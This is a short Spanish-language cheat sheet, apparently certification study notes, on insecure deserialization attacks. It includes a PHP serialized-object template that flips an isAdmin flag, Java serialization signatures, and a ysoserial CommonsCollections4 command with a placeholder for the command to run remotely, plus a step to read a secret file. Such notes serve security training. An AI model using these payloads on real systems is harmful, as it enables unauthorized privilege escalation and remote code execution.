---
tipo: cheatsheet
vuln: deserializacion
tags: [bscp, tipo/cheatsheet, vuln/deserializacion]
relacionada: "[[Deserializacion]]"
---

# CS · Deserializacion

## Flujo repetible
1. Identifica datos serializados (PHP/Java/…).
2. Manipula el objeto para escalar.
3. Si hace falta RCE, usa gadget chain.

## Detección
```
Localiza cookies/params serializados: PHP (O:...), Java (base64 rO0AB / bytes ac ed 00 05).
```

## Plantillas de payload
```
PHP: O:4:"User":2:{s:8:"username";s:6:"{{TARGET_USER}}";s:7:"isAdmin";b:1;}
     (abusa __wakeup/__destruct; considera PHAR)
Java: base64 rO0AB / bytes ac ed 00 05
     java -jar ysoserial.jar CommonsCollections4 '{{CMD}}' | base64   ⚠️
```

## Escalada al objetivo
Escalar privilegio o RCE → leer {{SECRET_PATH}}.

## Checklist
- [ ] Identifiqué el formato serializado
- [ ] Manipulé campos para escalar
- [ ] Probé gadget chain si tocaba RCE

## Referencias
- https://portswigger.net/web-security/deserialization
